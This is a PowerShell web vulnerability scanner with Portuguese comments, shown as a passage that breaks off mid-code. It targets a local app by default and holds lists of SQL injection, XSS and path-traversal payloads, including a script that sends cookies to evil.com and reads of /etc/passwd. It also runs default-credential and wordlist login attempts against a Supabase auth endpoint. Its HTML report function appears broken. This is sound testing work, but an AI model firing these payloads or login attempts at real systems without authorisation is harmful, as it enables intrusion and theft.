# =========================================
# ADVANCED SECURITY TESTING FRAMEWORK
# =========================================

#region Parameters
param(
    [Parameter(Mandatory = $false)]
    # CORREÇÃO: Usando 127.0.0.1 (IPv4 loopback) em vez de localhost para evitar problemas de resolução IPv6 (::1).
    [string]$TargetURL = "http://127.0.0.1:3000", 
    
    [Parameter(Mandatory = $false)]
    [string]$SupabaseURL = "http://localhost:54321",
    
    [Parameter(Mandatory = $false)]
    [string]$SupabaseKey,
    
    [Parameter(Mandatory = $false)]
    [string]$WordlistPath,
    
    [Parameter(Mandatory = $false)]
    [int]$MaxConcurrentRequests = 1,
    
    [Parameter(Mandatory = $false)]
    [switch]$SkipBruteForce,
    
    [Parameter(Mandatory = $false)]
    [switch]$SkipDOSCheck,
    
    [Parameter(Mandatory = $false)]
    [switch]$SaveResponses,
    
    [Parameter(Mandatory = $false)]
    [ValidateSet("Quick", "Standard", "Comprehensive")]
    [string]$ScanMode = "Standard",
    
    [Parameter(Mandatory = $false)]
    [string]$Proxy,
    
    [Parameter(Mandatory = $false)]
    [string]$CustomHeaders,
    
    [Parameter(Mandatory = $false)]
    [switch]$VerboseOutput
)

# Add required assemblies
Add-Type -AssemblyName System.Web
#endregion

#region Configuration
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Create session for connection reuse
$session = $null
$headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Security-Scanner/1.0"
}

if ($CustomHeaders) {
    $CustomHeaders.Split(";") | ForEach-Object {
        $keyValue = $_.Split("=")
        if ($keyValue.Count -eq 2) {
            $headers[$keyValue[0].Trim()] = $keyValue[1].Trim()
        }
    }
}

# Define scan intensity based on mode
$scanConfig = @{
    "Quick" = @{
        SQLiPayloads = 3
        XSSPayloads = 2
        DirectoryTests = 5
        PortChecks = 0
    }
    "Standard" = @{
        SQLiPayloads = 10
        XSSPayloads = 5
        DirectoryTests = 15
        PortChecks = 10
    }
    "Comprehensive" = @{
        SQLiPayloads = 25
        XSSPayloads = 15
        DirectoryTests = 50
        PortChecks = 20
    }
}

$config = $scanConfig[$ScanMode]

# Create output directory structure
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$hostname = ([System.Uri]$TargetURL).Host
$baseDir = Join-Path $PSScriptRoot "SecurityAudit_${hostname}_$timestamp"

$directories = @{
    Base = $baseDir
    Reports = Join-Path $baseDir "reports"
    Evidence = Join-Path $baseDir "evidence"
    Logs = Join-Path $baseDir "logs"
    Responses = Join-Path $baseDir "responses"
    Screenshots = Join-Path $baseDir "screenshots"
    Data = Join-Path $baseDir "data"
}

$directories.Values | ForEach-Object { 
    New-Item -ItemType Directory -Force -Path $_ | Out-Null 
}

# Log file
$logFile = Join-Path $directories.Logs "audit_$timestamp.log"
#endregion

#region Global Variables
$global:results = [System.Collections.ArrayList]@()
$global:vulnerabilities = [System.Collections.ArrayList]@()
$global:warnings = [System.Collections.ArrayList]@()
$global:informational = [System.Collections.ArrayList]@()
$global:evidence = [System.Collections.ArrayList]@()

$global:stats = @{
    TotalRequests = 0
    TotalTests = 0
    SuccessfulRequests = 0
    FailedRequests = 0
    StartTime = Get-Date
    ExecutionTime = [System.Diagnostics.Stopwatch]::StartNew()
}

$global:targetInfo = @{
    URL = $TargetURL
    Hostname = $hostname
    IPAddress = $null
    ServerHeaders = @()
    Technologies = @()
    OpenPorts = @()
}
#endregion

#region Logging Functions
function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO",
        [switch]$Console
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    
    Add-Content -Path $logFile -Value $logMessage
    
    if ($Console -or $VerboseOutput) {
        $color = switch($Level) {
            "ERROR" { "Red" }
            "WARN" { "Yellow" }
            "INFO" { "Cyan" }
            "SUCCESS" { "Green" }
            "DEBUG" { "Gray" }
            default { "White" }
        }
        Write-Host $logMessage -ForegroundColor $color
    }
}

function Save-Evidence {
    param(
        [string]$Category,
        [string]$TestName,
        [string]$Description,
        [string]$Content,
        [string]$FileName
    )
    
    if ($SaveResponses -and $Content) {
        $evidenceFile = Join-Path $directories.Evidence $FileName
        $Content | Out-File -FilePath $evidenceFile -Encoding UTF8
        
        $evidenceItem = @{
            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            Category = $Category
            TestName = $TestName
            Description = $Description
            FilePath = $evidenceFile
        }
        $global:evidence.Add($evidenceItem) | Out-Null
        
        Write-Log "Evidence saved: $evidenceFile" -Level DEBUG
    }
}
#endregion

#region Core Functions
function Invoke-SafeRequest {
    param(
        [string]$Uri,
        [string]$Method = "GET",
        [hashtable]$Headers = @{},
        [string]$Body,
        [int]$TimeoutSec = 10,
        [switch]$ReturnResponse
    )
    
    $requestId = [Guid]::NewGuid().ToString("N").Substring(0,8)
    Write-Log "[REQ-$requestId] $Method $Uri" -Level DEBUG
    
    try {
        $params = @{
            Uri = $Uri
            Method = $Method
            TimeoutSec = $TimeoutSec
            UserAgent = $headers["User-Agent"]
            Headers = $Headers
            UseBasicParsing = $true
            SessionVariable = 'session'
        }
        
        if ($Body) {
            $params.Body = $Body
            $params.ContentType = 'application/x-www-form-urlencoded'
        }
        
        if ($Proxy) {
            $params.Proxy = $Proxy
        }
        
        $response = Invoke-WebRequest @params -ErrorAction Stop
        $global:stats.TotalRequests++
        $global:stats.SuccessfulRequests++
        
        Write-Log "[REQ-$requestId] Status: $($response.StatusCode)" -Level DEBUG
        
        if ($ReturnResponse) {
            return @{
                Success = $true
                Response = $response
                StatusCode = $response.StatusCode
                Headers = $response.Headers
                Content = $response.Content
                RawContent = $response.RawContent
            }
        }
        
        return @{ Success = $true; StatusCode = $response.StatusCode }
        
    } catch {
        $global:stats.TotalRequests++
        $global:stats.FailedRequests++
        
        $errorDetails = $_.Exception.Message
        Write-Log "[REQ-$requestId] Failed: $errorDetails" -Level DEBUG
        
        if ($ReturnResponse) {
            return @{
                Success = $false
                Error = $errorDetails
                StatusCode = $null
            }
        }
        
        return @{ Success = $false; Error = $errorDetails }
    }
}

function Add-TestResult {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Category,
        
        [Parameter(Mandatory=$true)]
        [string]$TestName,
        
        [Parameter(Mandatory=$true)]
        [string]$Details,
        
        [Parameter(Mandatory=$true)]
        [ValidateSet("VULNERABLE", "WARNING", "SECURE", "INFO", "ERROR")]
        [string]$Status,
        
        [Parameter(Mandatory=$false)]
        [ValidateSet("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")]
        [string]$Severity = "INFO",
        
        [string]$Recommendation,
        [string]$CWE,
        [string]$Remediation,
        [object]$Evidence
    )
    
    $result = [PSCustomObject]@{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Category = $Category
        TestName = $TestName
        Details = $Details
        Status = $Status
        Severity = $Severity
        Recommendation = $Recommendation
        CWE = $CWE
        Remediation = $Remediation
        Evidence = $Evidence
    }
    
    $global:results.Add($result) | Out-Null
    $global:stats.TotalTests++
    
    switch ($Status) {
        "VULNERABLE" { $global:vulnerabilities.Add($result) | Out-Null }
        "WARNING" { $global:warnings.Add($result) | Out-Null }
        "INFO" { $global:informational.Add($result) | Out-Null }
    }
    
    # Console output
    $color = switch($Status) {
        "VULNERABLE" { 
            switch($Severity) {
                "CRITICAL" { "Red" }
                "HIGH" { "DarkRed" }
                "MEDIUM" { "Yellow" }
                "LOW" { "DarkYellow" }
                default { "Red" }
            }
        }
        "WARNING" { "Yellow" }
        "SECURE" { "Green" }
        "INFO" { "Cyan" }
        "ERROR" { "Magenta" }
        default { "White" }
    }
    
    # Usa caracteres ASCII simples para evitar erro de encoding.
    $statusSymbol = switch($Status) {
        "VULNERABLE" { "x" } 
        "WARNING" { "!" }
        "SECURE" { "v" } 
        "INFO" { "i" }
        "ERROR" { "e" } 
        default { " " }
    }
    
    Write-Host "[$statusSymbol] " -NoNewline -ForegroundColor $color
    # Usa ${TestName}: para resolver o erro de interpolação de variáveis.
    Write-Host "$Category - ${TestName}: $Details" -ForegroundColor $color
    
    # Log to file
    # Usa ${TestName}: para resolver o erro de interpolação de variáveis.
    Write-Log "[$Status] $Category - ${TestName}: $Details" -Level $Status
}

function Test-Endpoint {
    param(
        [string]$Url,
        [string]$ExpectedStatus = "200",
        [string]$TestName = "Endpoint Check"
    )
    
    $result = Invoke-SafeRequest -Uri $Url -ReturnResponse
    if ($result.Success -and $result.StatusCode -eq $ExpectedStatus) {
        return $true, $result
    }
    return $false, $result
}
#endregion

#region Report Generation Functions (Missing in original, added for completeness)

function New-TxtReport {
    param([string]$Path)
    $content = @()
    $content += "Security Audit Report - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    $content += "=================================================="
    $content += "Target: $($global:targetInfo.URL)"
    $content += "Scan Mode: $ScanMode"
    $content += "--------------------------------------------------"
    $content += "SUMMARY:"
    $content += "Total Tests: $($global:stats.TotalTests)"
    $content += "Vulnerabilities: $($global:vulnerabilities.Count)"
    $content += "Warnings: $($global:warnings.Count)"
    $content += "Execution Time: $([System.Math]::Round($global:stats.ExecutionTime.Elapsed.TotalMinutes, 2)) minutes"
    $content += "--------------------------------------------------"
    $content += "`nVULNERABILITIES (Severity - Name):"
    $global:vulnerabilities | ForEach-Object {
        $content += " - $($_.Severity.PadRight(10)) | $($_.TestName.PadRight(30)) | $($_.Details)"
    }
    $content += "`nWARNINGS (Name):"
    $global:warnings | ForEach-Object {
        $content += " - $($_.TestName.PadRight(30)) | $($_.Details)"
    }
    $content += "`nFULL RESULTS:"
    $global:results | ForEach-Object {
        $content += "--------------------------------------------------"
        $content += "Category: $($_.Category)"
        $content += "Test: $($_.TestName)"
        $content += "Status: $($_.Status)"
        if ($_.Status -eq "VULNERABLE") {
            $content += "Severity: $($_.Severity)"
            $content += "CWE: $($_.CWE)"
            $content += "Recommendation: $($_.Recommendation)"
        }
        $content += "Details: $($_.Details)"
    }
    $content | Out-File -FilePath $Path -Encoding UTF8
    return $Path
}

function New-HtmlReport {
    param([string]$Path)
    $htmlContent = @"
<!DOCTYPE html>
<html>
<head>
    <title>Security Audit Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f9; color: #333; }
        .container { max-width: 1000px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
        h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
        h2 { color: #34495e; border-left: 5px solid #3498db; padding-left: 10px; margin-top: 20px; }
        .summary-box { display: flex; justify-content: space-around; margin-bottom: 20px; text-align: center; }
        .summary-item { padding: 15px; border-radius: 5px; width: 20%; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05); }
        .vulnerable { background-color: #e74c3c; color: white; }
        .warning { background-color: #f1c40f; color: #333; }
        .secure { background-color: #2ecc71; color: white; }
        .info { background-color: #3498db; color: white; }
        .error { background-color: #9b59b6; color: white; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #ecf0f1; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Security Audit Report for $($global:targetInfo.URL)</h1>
        <p><strong>Scan Date:</strong> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')</p>
        <p><strong>Scan Mode:</strong> $ScanMode</p>
        <p><strong>Execution Time:</strong> $([System.Math]::Round($global:stats.ExecutionTime.Elapsed.TotalMinutes, 2)) minutes</p>

        <h2>Summary</h2>
        <div class="summary-box">
            <div class="summary-item vulnerable">
                <h3>Vulnerabilities</h3>
                <p>$($global:vulnerabilities.Count)</p>
            </div>
            <div class="summary-item warning">
                <h3>Warnings</h3>
                <p>$($global:warnings.Count)</p>
            </div>
            <div class="summary-item secure">
                <h3>Secure</h3>
                <p>$($global:results | Where-Object { $_.Status -eq "SECURE" } | Measure-Object).Count</p>
            </div>
            <div class="summary-item info">
                <h3>Total Tests</h3>
                <p>$($global:stats.TotalTests)</p>
            </div>
        </div>

        <h2>Detailed Findings</h2>
        <table>
            <thead>
                <tr>
                    <th>Status</th>
                    <th>Category</th>
                    <th>Test Name</th>
                    <th>Severity</th>
                    <th>Details</th>
                </tr>
            </thead>
            <tbody>
@
    $global:results | ForEach-Object {
        $statusClass = $_.Status.ToLower()
        $row = "                <tr class='$statusClass'>"
        $row += "<td>$($_.Status)</td>"
        $row += "<td>$($_.Category)</td>"
        $row += "<td>$($_.TestName)</td>"
        $row += "<td>$($_.Severity)</td>"
        $row += "<td>$($_.Details | Out-String | ConvertTo-Html -Fragment)</td>"
        $row += "</tr>"
        $htmlContent += $row
    }
@
            </tbody>
        </table>
    </div>
</body>
</html>
"@
    $htmlContent | Out-File -FilePath $Path -Encoding UTF8
    return $Path
}

function New-JsonReport {
    param([string]$Path)
    $reportData = @{
        Metadata = $global:targetInfo
        Stats = $global:stats
        Results = $global:results
        Vulnerabilities = $global:vulnerabilities
        Warnings = $global:warnings
        Evidence = $global:evidence
    }
    $reportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $Path -Encoding UTF8
    return $Path
}

function New-CsvReport {
    param([string]$Path)
    $global:results | Select-Object Timestamp, Category, TestName, Details, Status, Severity, CWE, Recommendation | Export-Csv -Path $Path -NoTypeInformation -Encoding UTF8
    return $Path
}
#endregion

#region Banner
Write-Host "`n" -NoNewline
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "############################################################" -ForegroundColor Cyan
Write-Host "#             SECURITY TESTING FRAMEWORK                   #" -ForegroundColor Cyan
Write-Host "#                   Advanced Edition                       #" -ForegroundColor Cyan
Write-Host "############################################################" -ForegroundColor Cyan
Write-Host "`n"

Write-Host "------------------------------------------------------------" -ForegroundColor Yellow
Write-Host "| Target:          $($TargetURL.PadRight(40)) |" -ForegroundColor Yellow
Write-Host "| Scan Mode:       $($ScanMode.PadRight(40)) |" -ForegroundColor Yellow
Write-Host "| Timestamp:       $((Get-Date -Format 'yyyy-MM-dd HH:mm:ss').PadRight(40)) |" -ForegroundColor Yellow
Write-Host "------------------------------------------------------------" -ForegroundColor Yellow
Write-Host "`n"
#endregion

#region Phase 1: Reconnaissance
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 1: RECONNAISSANCE" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 1: Reconnaissance" -Console

# Get target IP
try {
    # Usando a URL para garantir que o hostname seja o correto (127.0.0.1 ou o que for passado)
    $ipAddress = [System.Net.Dns]::GetHostAddresses($hostname) | Select-Object -First 1
    $global:targetInfo.IPAddress = $ipAddress.IPAddressToString
    Write-Log "Resolved $hostname to $($global:targetInfo.IPAddress)" -Console
} catch {
    Write-Log "Could not resolve hostname: $hostname" -Level WARN -Console
}

# Test basic connectivity
Write-Host "`n[1.1] Testing connectivity..." -ForegroundColor Gray
$connectivity = Test-Endpoint -Url $TargetURL -TestName "Initial Connectivity"
if ($connectivity[0]) {
    Add-TestResult -Category "Connectivity" -TestName "Target Reachable" `
        -Details "Target is responding to requests" -Status "SECURE" -Severity "INFO"
} else {
    Add-TestResult -Category "Connectivity" -TestName "Target Reachable" `
        -Details "Target is not reachable. Check if the server at $TargetURL is running." -Status "ERROR" -Severity "INFO"
    Write-Host "ERROR: Target is not reachable. Check if the server at $TargetURL is running. Exiting..." -ForegroundColor Red
    exit 1
}

# Get server headers and technology info
Write-Host "`n[1.2] Gathering server information..." -ForegroundColor Gray
$response = Invoke-SafeRequest -Uri $TargetURL -ReturnResponse
if ($response.Success) {
    $serverHeaders = $response.Response.Headers
    
    # Check for server headers
    $serverHeader = $serverHeaders["Server"]
    if ($serverHeader) {
        $global:targetInfo.ServerHeaders += $serverHeader
        Write-Log "Server header detected: $serverHeader" -Console
    }
    
    # Check common technology indicators
    $techIndicators = @{
        "X-Powered-By" = "Server Technology"
        "X-AspNet-Version" = "ASP.NET"
        "X-AspNetMvc-Version" = "ASP.NET MVC"
        "X-Generator" = "CMS/Framework"
        "X-Drupal-Cache" = "Drupal"
        "X-WP-Total" = "WordPress"
    }
    
    foreach ($indicator in $techIndicators.Keys) {
        if ($serverHeaders[$indicator]) {
            $tech = "$($techIndicators[$indicator]): $($serverHeaders[$indicator])"
            $global:targetInfo.Technologies += $tech
            Write-Log "Technology detected: $tech" -Console
        }
    }
    
    # Check response body for technology signatures
    $body = $response.Response.Content
    $techPatterns = @{
        "jquery" = "jQuery"
        "react" = "React"
        "vue" = "Vue.js"
        "angular" = "Angular"
        "wordpress" = "WordPress"
        "drupal" = "Drupal"
        "joomla" = "Joomla"
    }
    
    foreach ($pattern in $techPatterns.Keys) {
        if ($body -match $pattern) {
            $global:targetInfo.Technologies += $techPatterns[$pattern]
        }
    }
}
#endregion

#region Phase 2: Vulnerability Scanning
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 2: VULNERABILITY SCANNING" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 2: Vulnerability Scanning" -Console

# Test 1: Advanced SQL Injection
Write-Host "`n[2.1] Testing SQL Injection (Advanced)..." -ForegroundColor Gray
$sqliPayloads = @(
    # Basic injections
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    
    # Union based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    
    # Error based
    "' AND 1=CAST((SELECT @@version) AS INT)--",
    "'; WAITFOR DELAY '0:0:5'--",
    
    # Blind boolean
    "' AND SLEEP(5)--",
    "' OR IF(1=1,SLEEP(5),0)--"
)
# Resto do código de teste SQLi
$sqliDetected = 0
$sqliEvidence = @()

foreach($payload in $sqliPayloads[0..($config.SQLiPayloads-1)]) {
    try {
        $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
        
        # Test in URL parameters
        $url = "$TargetURL/login?email=$encoded&password=test"
        $result = Invoke-SafeRequest -Uri $url -ReturnResponse
        
        if ($result.Success) {
            $content = $result.Content
            $evidenceId = "sqli_" + (Get-Random -Minimum 1000 -Maximum 9999)
            
            # Check for SQL error patterns
            $sqlErrors = @(
                "SQL", "mysql", "syntax", "ORA-", "PostgreSQL", "SQLite",
                "Microsoft.*ODBC", "Driver.*SQL", "Unclosed quotation mark",
                "Incorrect syntax", "divide by zero"
            )
            
            foreach ($error in $sqlErrors) {
                if ($content -match $error) {
                    $sqliDetected++
                    $sqliEvidence += @{
                        Payload = $payload
                        Type = "SQL Error Detected"
                        Error = $error
                        EvidenceId = $evidenceId
                    }
                    
                    Save-Evidence -Category "SQLi" -TestName "Error Based" `
                        -Description "SQL error response" -Content $content `
                        -FileName "${evidenceId}.txt"
                    break
                }
            }
            
            # Check for time delays (blind SQLi)
            if ($payload -match "SLEEP|WAITFOR") {
                if ($result.Response.TimeToFirstByte -gt 4000) {
                    $sqliDetected++
                    $sqliEvidence += @{
                        Payload = $payload
                        Type = "Time Based"
                        Delay = $result.Response.TimeToFirstByte
                        EvidenceId = $evidenceId
                    }
                }
            }
        }
    } catch {
        Write-Log "SQLi test failed: $($_.Exception.Message)" -Level DEBUG
    }
}

if($sqliDetected -gt 0) {
    Add-TestResult -Category "Injection" -TestName "SQL Injection" `
        -Details "$sqliDetected SQL injection patterns detected" `
        -Status "VULNERABLE" -Severity "CRITICAL" `
        -Recommendation "Use parameterized queries or prepared statements" `
        -CWE "CWE-89" `
        -Remediation "Implement input validation and use ORM frameworks with parameterized queries" `
        -Evidence $sqliEvidence
} else {
    Add-TestResult -Category "Injection" -TestName "SQL Injection" `
        -Details "No SQL injection vulnerabilities detected" `
        -Status "SECURE" -Severity "INFO" `
        -Recommendation "Continue using parameterized queries"
}

# Test 2: Advanced XSS Testing
Write-Host "`n[2.2] Testing Cross-Site Scripting (Advanced)..." -ForegroundColor Gray
$xssPayloads = @(
    # Basic scripts
    "<script>alert('XSS')</script>",
    "<script>confirm('XSS')</script>",
    "<script>prompt('XSS')</script>",
    
    # Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    
    # JavaScript URIs
    "javascript:alert('XSS')",
    "JaVaScRipT:alert('XSS')",
    
    # Encoded payloads
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    
    # DOM based
    "<script>document.location='http://evil.com/?c='+document.cookie</script>"
)

$xssDetected = 0
$xssEvidence = @()

foreach($payload in $xssPayloads[0..($config.XSSPayloads-1)]) {
    try {
        $testUrl = "$TargetURL/search?q=$payload"
        $result = Invoke-SafeRequest -Uri $testUrl -ReturnResponse
        
        if ($result.Success) {
            $content = $result.Content
            $evidenceId = "xss_" + (Get-Random -Minimum 1000 -Maximum 9999)
            
            # Check if payload is reflected without encoding
            $decodedPayload = [System.Web.HttpUtility]::HtmlDecode($payload)
            if ($content -match [regex]::Escape($decodedPayload)) {
                $xssDetected++
                $xssEvidence += @{
                    Payload = $payload
                    Type = "Reflected XSS"
                    Location = "URL Parameter"
                    EvidenceId = $evidenceId
                }
                
                Save-Evidence -Category "XSS" -TestName "Reflected" `
                    -Description "XSS payload reflection" -Content $content `
                    -FileName "${evidenceId}.txt"
            }
        }
    } catch {
        Write-Log "XSS test failed: $($_.Exception.Message)" -Level DEBUG
    }
}

if($xssDetected -gt 0) {
    Add-TestResult -Category "XSS" -TestName "Cross-Site Scripting" `
        -Details "$xssDetected XSS vulnerabilities detected" `
        -Status "VULNERABLE" -Severity "HIGH" `
        -Recommendation "Implement proper output encoding and Content Security Policy" `
        -CWE "CWE-79" `
        -Remediation "Use frameworks that auto-escape content and implement CSP headers" `
        -Evidence $xssEvidence
} else {
    Add-TestResult -Category "XSS" -TestName "Cross-Site Scripting" `
        -Details "No XSS vulnerabilities detected" `
        -Status "SECURE" -Severity "INFO" `
        -Recommendation "Continue input validation and output encoding practices"
}

# Test 3: Directory Traversal
Write-Host "`n[2.3] Testing Directory Traversal..." -ForegroundColor Gray
$traversalPayloads = @(
    "../../../../etc/passwd",
    "..\..\..\..\windows\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
)

$traversalDetected = 0
foreach($payload in $traversalPayloads) {
    try {
        $testUrl = "$TargetURL/download?file=$payload"
        $result = Invoke-SafeRequest -Uri $testUrl -ReturnResponse
        
        if ($result.Success -and $result.Content -match "root:|\[fonts\]") {
            $traversalDetected++
        }
    } catch {
        Write-Log "Traversal test failed: $($_.Exception.Message)" -Level DEBUG
    }
}

if($traversalDetected -gt 0) {
    Add-TestResult -Category "Path Traversal" -TestName "Directory Traversal" `
        -Details "Directory traversal vulnerability detected" `
        -Status "VULNERABLE" -Severity "HIGH" `
        -CWE "CWE-22" `
        -Recommendation "Validate file paths and use allow lists"
} else {
    Add-TestResult -Category "Path Traversal" -TestName "Directory Traversal" `
        -Details "No directory traversal vulnerabilities detected" `
        -Status "SECURE" -Severity "INFO"
}

# Test 4: Security Headers Check
Write-Host "`n[2.4] Testing Security Headers..." -ForegroundColor Gray
$response = Invoke-SafeRequest -Uri $TargetURL -ReturnResponse
if ($response.Success) {
    $headers = $response.Response.Headers
    
    $securityHeaders = @{
        "X-Content-Type-Options" = @{
            Expected = "nosniff"
            Description = "Prevents MIME type sniffing"
            Severity = "MEDIUM"
        }
        "X-Frame-Options" = @{
            Expected = "DENY"
            Description = "Prevents clickjacking"
            Severity = "MEDIUM"
        }
        "X-XSS-Protection" = @{
            Expected = "1; mode=block"
            Description = "Enables XSS filter"
            Severity = "LOW"
        }
        "Content-Security-Policy" = @{
            Expected = "*"
            Description = "Defines content sources"
            Severity = "HIGH"
        }
        "Strict-Transport-Security" = @{
            Expected = "max-age=31536000; includeSubDomains"
            Description = "Enforces HTTPS"
            Severity = "HIGH"
        }
        "Referrer-Policy" = @{
            Expected = "strict-origin-when-cross-origin"
            Description = "Controls referrer information"
            Severity = "LOW"
        }
    }
    
    $missingHeaders = @()
    foreach ($header in $securityHeaders.Keys) {
        if (-not $headers[$header]) {
            $missingHeaders += @{
                Header = $header
                Description = $securityHeaders[$header].Description
                Severity = $securityHeaders[$header].Severity
            }
        }
    }
    
    if ($missingHeaders.Count -gt 0) {
        Add-TestResult -Category "Headers" -TestName "Security Headers" `
            -Details "$($missingHeaders.Count) security headers missing" `
            -Status "WARNING" -Severity "MEDIUM" `
            -Recommendation "Implement missing security headers" `
            -Remediation "Add security headers to web server configuration" `
            -Evidence $missingHeaders
    } else {
        Add-TestResult -Category "Headers" -TestName "Security Headers" `
            -Details "All recommended security headers present" `
            -Status "SECURE" -Severity "INFO"
    }
}

# Test 5: Sensitive File Exposure
Write-Host "`n[2.5] Testing Sensitive File Exposure..." -ForegroundColor Gray
$sensitiveFiles = @(
    "/.env",
    "/.git/config",
    "/.htaccess",
    "/web.config",
    "/package.json",
    "/composer.json",
    "/yarn.lock",
    "/package-lock.json",
    "/README.md",
    "/CHANGELOG.md",
    "/LICENSE",
    "/robots.txt",
    "/sitemap.xml",
    "/admin",
    "/wp-admin",
    "/phpinfo.php",
    "/test.php",
    "/debug.php"
)

$exposedFiles = @()
foreach ($file in $sensitiveFiles[0..($config.DirectoryTests-1)]) {
    try {
        $result = Test-Endpoint -Url "$TargetURL$file"
        if ($result[0]) {
            $exposedFiles += $file
            Write-Log "Sensitive file exposed: $file" -Level WARN
        }
    } catch {
        Write-Log "File check failed: $file" -Level DEBUG
    }
}

if ($exposedFiles.Count -gt 0) {
    Add-TestResult -Category "Information Disclosure" -TestName "Sensitive Files" `
        -Details "$($exposedFiles.Count) sensitive files exposed" `
        -Status "VULNERABLE" -Severity "MEDIUM" `
        -Recommendation "Restrict access to sensitive files" `
        -CWE "CWE-200" `
        -Remediation "Implement proper file permissions and web server restrictions" `
        -Evidence $exposedFiles
} else {
    Add-TestResult -Category "Information Disclosure" -TestName "Sensitive Files" `
        -Details "No sensitive files exposed" `
        -Status "SECURE" -Severity "INFO"
}
#endregion

#region Phase 3: Authentication & Authorization
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 3: AUTHENTICATION & AUTHORIZATION" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 3: Authentication & Authorization" -Console

# Test 6: Default Credentials
if (-not $SkipBruteForce) {
    Write-Host "`n[3.1] Testing Default Credentials..." -ForegroundColor Gray
    
    $defaultCreds = @(
        @{email="admin@admin.com"; password="admin"},
        @{email="administrator@localhost"; password="administrator"},
        @{email="root@localhost"; password="root"},
        @{email="test@test.com"; password="test"},
        @{email="user@user.com"; password="user"}
    )
    
    if ($WordlistPath -and (Test-Path $WordlistPath)) {
        Write-Log "Loading custom wordlist from: $WordlistPath" -Console
        $customCreds = Get-Content $WordlistPath | ForEach-Object {
            $parts = $_ -split ":"
            if ($parts.Count -eq 2) {
                @{email=$parts[0]; password=$parts[1]}
            }
        }
        $defaultCreds += $customCreds
    }
    
    $credSuccess = 0
    $successfulCreds = @()
    foreach($cred in $defaultCreds) {
        try {
            if ($SupabaseKey) {
                $body = @{
                    email = $cred.email
                    password = $cred.password
                } | ConvertTo-Json
                
                $result = Invoke-SafeRequest -Uri "$SupabaseURL/auth/v1/token" -Method POST `
                    -Headers @{"apikey"=$SupabaseKey; "Content-Type"="application/json"} `
                    -Body $body -ReturnResponse
                
                if ($result.Success -and $result.StatusCode -eq 200) {
                    $credSuccess++
                    $successfulCreds += "$($cred.email):$($cred.password)"
                    Write-Log "Successful login with: $($cred.email)" -Level WARN
                }
            }
        } catch {
            Write-Log "Auth test failed: $($_.Exception.Message)" -Level DEBUG
        }
    }
    
    if($credSuccess -gt 0) {
        Add-TestResult -Category "Authentication" -TestName "Default Credentials" `
            -Details "$credSuccess successful logins with default credentials" `
            -Status "VULNERABLE" -Severity "CRITICAL" `
            -Recommendation "Change all default credentials immediately" `
            -CWE "CWE-1392" `
            -Remediation "Implement strong password policies and remove default accounts" `
            -Evidence $successfulCreds
    } else {
        Add-TestResult -Category "Authentication" -TestName "Default Credentials" `
            -Details "No default credentials found" `
            -Status "SECURE" -Severity "INFO"
    }
}

# Test 7: Session Management
Write-Host "`n[3.2] Testing Session Management..." -ForegroundColor Gray
try {
    # Check for session cookies without secure flag
    $response = Invoke-SafeRequest -Uri $TargetURL -ReturnResponse
    if ($response.Success) {
        $cookies = $response.Response.Headers["Set-Cookie"]
        $sessionIssues = @()
        
        if ($cookies) {
            if ($cookies -notmatch "Secure") {
                $sessionIssues += "Missing Secure flag"
            }
            if ($cookies -notmatch "HttpOnly") {
                $sessionIssues += "Missing HttpOnly flag"
            }
            if ($cookies -match "SameSite=None" -and $cookies -notmatch "Secure") {
                $sessionIssues += "SameSite=None without Secure flag"
            }
        }
        
        if ($sessionIssues.Count -gt 0) {
            Add-TestResult -Category "Session" -TestName "Cookie Security" `
                -Details "Session cookie security issues: $($sessionIssues -join ', ')" `
                -Status "WARNING" -Severity "MEDIUM" `
                -Recommendation "Implement secure cookie flags" `
                -CWE "CWE-614" `
                -Remediation "Set Secure, HttpOnly, and appropriate SameSite flags on cookies"
        } else {
            Add-TestResult -Category "Session" -TestName "Cookie Security" `
                -Details "Session cookies properly configured" `
